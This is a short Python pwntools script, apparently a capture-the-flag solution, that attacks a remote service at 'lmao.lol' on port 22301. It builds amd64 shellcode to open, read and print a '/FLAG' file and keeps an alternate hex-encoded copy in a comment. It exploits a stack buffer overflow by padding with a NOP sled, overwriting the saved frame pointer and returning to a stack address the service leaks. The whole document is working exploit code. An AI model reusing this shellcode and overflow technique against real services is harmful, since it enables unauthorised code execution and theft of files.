from pwn import *
import struct


def interact_with_process(binary_path, host=None, port=None):
    # Start the process
    if host and port:
        p = remote(host, port)
    else:
        p = process(binary_path)

    context.arch = 'amd64'


    shellcode = asm('''
           XOR RAX, RAX
           MOV RAX, 0x47414C462F
           PUSH RAX
           MOV RDI, RSP


           XOR RSI, RSI
           XOR RDX, RDX
           MOV RAX, 2
           SYSCALL

           MOV RDI, RAX
           MOV RSI, RSP
           MOV RDX, 200
           XOR RAX, RAX
           SYSCALL

           MOV RDI, 1
           MOV RSI, RSP
           MOV RDX, 200
           MOV RAX, 1
           SYSCALL

           XOR RDI, RDI
           MOV RAX, 60
           SYSCALL

       ''')

    # shellcode = b"\x48\x31\xc0\x50\x48\xbb\x2f\x46\x4c\x41\x47\x00\x00\x00\x53\xc6\x44\x24\x01\x46\x80\x74\x24\x01\x20\xc6\x44\x24\x02\x4c\x80\x74\x24\x02\x20\xc6\x44\x24\x03\x41\x80\x74\x24\x03\x20\xc6\x44\x24\x04\x47\x80\x74\x24\x04\x20\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x48\xc7\xc0\x02\x00\x00\x00\x0f\x05\x48\x89\xc7\x48\x89\xe6\x48\xc7\xc2\xc8\x00\x00\x00\x48\x31\xc0\x0f\x05\x48\xc7\xc7\x01\x00\x00\x00\x48\x89\xe6\x48\xc7\xc2\xc8\x00\x00\x00\x48\xc7\xc0\x01\x00\x00\x00\x0f\x05\x48\x31\xff\x48\xc7\xc0\x3c\x00\x00\x00\x0f\x05"

    padding_size = (0x2000 - len(shellcode))

    padding = b"\x90" * padding_size

    padding_rbp = b"A" * 8
    # print('padding_size is :', padding_size)

    # print("Shellcode: ", shellcode.hex())

    p.recvuntil(b'Here is a random stack address: ')
    rdn_addr_str = p.recvline().strip(b'\n')
    rdn_addr = int(rdn_addr_str, 16)
    ret_address = p64(rdn_addr)
    # print(f"Random stack address: {ret_address}")

    payload = padding + shellcode + padding_rbp + ret_address
    # print('payload:', payload)

    # Send the payload
    p.sendline(payload)
    p.interactive()


# Example usage
interact_with_process('', 'lmao.lol', 22301)
